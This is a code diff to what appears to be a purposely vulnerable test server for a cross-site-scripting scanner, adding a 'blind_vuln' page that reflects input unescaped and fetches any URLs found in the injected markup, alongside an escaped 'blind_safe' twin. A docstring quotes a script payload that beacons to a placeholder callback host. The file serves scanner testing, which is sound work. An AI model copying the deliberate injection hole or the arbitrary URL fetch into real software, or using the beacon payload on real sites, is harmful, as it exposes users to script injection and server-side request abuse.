@@ -16,8 +16,10 @@ import json
 import os
 import re
 import sys
+from html.parser import HTMLParser   # Phase 124: parser-aware resource unfurl
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs, unquote, quote
+import urllib.request               # Phase 124: resolve unfurled resources
 
 _HERE = os.path.dirname(os.path.abspath(__file__))
 _MANIFEST_PATH = os.path.join(_HERE, "manifest.json")
@@ -1307,6 +1309,116 @@ def m_clobber_escaped(v: str, ctx: dict) -> tuple:
                  + _CLOBBER_SCRIPT)
 
 
+# ---------------------------------------------------------------------------
+# Phase 124: blind / OOB targets (L5_blind_oob).
+#
+# The layer needs three things: (1) --oob <mode> so scanner.oob exists at
+# all (the manifest carries it in extra_args), (2) the parameter must
+# reflect an UNESCAPED executable tag (<script / <svg / <img / <iframe /
+# <body ) -- _inject_blind's own gate, and (3) SOMETHING must later fetch
+# the callback URL the injected payload carries.
+#
+# (3) is what normally needs a browser.  This target models the victim's
+# resource loading without one: a link-unfurl / image-proxy style step
+# resolves the src|href attributes of REAL parsed elements.  It is
+# HTML-PARSER AWARE on purpose -- a regex sweep for http(s) URLs would
+# also unfurl the ESCAPED safe twin (an escaped payload still contains the
+# callback URL as text) and then the case would prove nothing.
+# ---------------------------------------------------------------------------
+
+_UNFURL_ATTRS = ("src", "href", "data", "poster", "action", "formaction",
+                 "srcdoc")
+_URL_IN_TEXT_RE = re.compile(r"https?://[^\s'\"<>]+")
+
+
+class _ResourceCollector(HTMLParser):
+    """Collect absolute URLs that REFLECTED MARKUP would actually resolve.
+
+    Phase 124 note: the blind payload the engine injects is
+    `<script>new Image().src='https://__OOB__/?c='+...</script>` -- the
+    callback URL lives in inline SCRIPT TEXT, not in any attribute.  So the
+    collector looks at three places, all of which require real markup:
+      * resource-ish attributes of a real start tag,
+      * event-handler attributes of a real start tag (onload=..., etc.),
+      * the text content of a real <script> element.
+    Plain text nodes are deliberately ignored -- that is what keeps the
+    escaped twin silent (its callback URL is only ever text).
+    """
+
+    def __init__(self):
+        super().__init__(convert_charrefs=True)
+        self.urls: list = []
+        self._open_tags: list = []
+
+    def _harvest(self, text: str) -> None:
+        if not text:
+            return
+        self.urls.extend(_URL_IN_TEXT_RE.findall(text))
+
+    def handle_starttag(self, tag, attrs):
+        if tag.lower() not in ("script", "style"):
+            self._open_tags.append(tag.lower())
+        else:
+            self._open_tags.append(tag.lower())
+        for name, value in attrs:
+            if not value:
+                continue
+            low = name.lower()
+            if low in _UNFURL_ATTRS or low.startswith("on"):
+                self._harvest(value)
+        # void elements never produce an endtag
+        if tag.lower() in ("img", "input", "meta", "link", "br", "hr",
+                           "source", "area", "base", "col", "embed",
+                           "track", "wbr") and self._open_tags:
+            self._open_tags.pop()
+
+    def handle_endtag(self, tag):
+        while self._open_tags:
+            t = self._open_tags.pop()
+            if t == tag.lower():
+                break
+
+    def handle_data(self, data):
+        if "script" in self._open_tags or "style" in self._open_tags:
+            self._harvest(data)
+
+
+def _unfurl(fragment: str) -> None:
+    """Best-effort resolve of resources referenced by REAL markup."""
+    if not fragment:
+        return
+    try:
+        parser = _ResourceCollector()
+        parser.feed(fragment)
+        urls = list(dict.fromkeys(parser.urls))[:3]
+    except Exception:
+        return
+    for u in urls:
+        try:
+            urllib.request.urlopen(u, timeout=2).read(2048)
+        except Exception:
+            pass
+
+
+def m_blind_vuln(v: str, ctx: dict) -> tuple:
+    """Raw reflection + resource unfurl: the injected callback really loads."""
+    _unfurl(v or "")
+    return _page("<h1>Link preview</h1>"
+                 f'<div id="preview">{v}</div>')
+
+
+def m_blind_safe(v: str, ctx: dict) -> tuple:
+    """Same page, same unfurler; the value is HTML-escaped before render.
+
+    Escaped input produces no parsed element at all, so nothing can be
+    resolved -- no beacon, no finding.
+    """
+    escaped = html.escape(v or "", quote=True)
+    _unfurl(escaped)
+    return _page("<h1>Link preview</h1>"
+                 f'<div id="preview">{escaped}</div>')
+
+
 MODES_CTX.update({
     "pm_vuln": m_pm_vuln,
     "pm_safe": m_pm_safe,
@@ -1320,6 +1432,8 @@ PAGE_MODES.update({
     "clobber_vuln": m_clobber_vuln,
     "clobber_safe": m_clobber_safe,
     "clobber_escaped": m_clobber_escaped,
+    "blind_vuln": m_blind_vuln,
+    "blind_safe": m_blind_safe,
 })
 
 POST_MODES.update({
